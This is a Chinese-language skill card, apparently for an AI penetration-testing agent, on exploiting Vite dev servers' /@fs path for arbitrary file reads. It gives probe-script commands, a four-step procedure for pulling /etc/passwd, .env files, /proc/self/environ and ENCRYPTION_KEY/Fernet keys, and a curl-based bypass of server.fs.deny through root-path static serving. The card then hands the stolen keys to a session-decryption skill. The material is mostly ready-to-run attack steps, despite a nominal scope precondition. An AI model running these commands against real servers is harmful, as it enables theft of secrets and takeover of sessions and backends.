---
name: vite-fs-read
description: >-
 授权目标上 Vite/开发服 /@fs 绝对路径任意读：passwd、package.json、.env、
 ENCRYPTION_KEY。用户提到 Vite @fs、/@fs/etc/passwd、vite 开发服读文件、
 前端容器读 .env 时使用。命中密钥后交接 fernet-session-decrypt；云控面板走 tg-cloud-panel。
---

# Vite `@fs` 任意读

**前提**：目标在 scope。这是读文件，不是 RCE。

| 档 | 成立 |
|----|------|
| L1 | `/@fs/etc/passwd` 或 `package.json` 可读 |
| L2 | `.env` / `ENCRYPTION_KEY` / Fernet 钥 |
| L3 | 解开 session 或进后端（交接，不在本卡硬解） |

```bash
python3 tools/ops/vite_fs_probe.py -u http://IP:5173 --case <案卷>
python3 tools/ops/vite_fs_probe.py -u http://IP:5173 --case <案卷> \
  --extra /app/backend/.env --extra /data/.env --extra /proc/self/environ
```

## 四刀

1. **认开发服** — 页含 `/@vite/client`，口常见 `:5173` `:3000` `:4173`  
2. **绝对读** — `/@fs/etc/passwd`；Windows `/@fs/C:/Windows/win.ini`  
3. **容器路径** — `/app/.env` `/src/.env` `/data/.env` `package.json` 里的 `main`  
4. **钥** — `ENCRYPTION_KEY` / `gAAAAA` → 立刻 `fernet-session-decrypt`；云控面板 → `tg-cloud-panel`

## ⚠️ 根路径绕过（188台实战新发现）

`server.fs.deny` **只约束 `/@fs/` 路径**，根路径静态服务不受限：
```bash
# /@fs/app/.env → 403（被 deny 拦）
# 但根路径直接读：
curl http://TARGET:5173/.env          # → 200（绕过 deny！）
curl "http://TARGET:5173/Dockerfile?raw"  # → 200
curl "http://TARGET:5173/src/App.tsx?raw" # → 200
```

### 版本边界
- Vite **7.3.2+** 已修补 CVE-2025-30208 家族（`?raw??` / `?import&raw??` 失效）
- `?raw` 仅放行 `/app` 内 + 少数绝对路径
- `/root/.ssh/id_rsa`、`/etc/shadow`、`.git/*` **仍不可读**
- `.env` 内容可能仅前端 `VITE_*` 公开变量，**无后端密钥**

**不要把"任意读"当"读一切"，必须实测版本 + 实读目标文件。**

只读到 passwd **不要**写接管结案。生产 nginx 反代掉 `/@fs` 才是阴性。
真源：`docs/playbooks/Vite开发服@fs任意读手法.md`
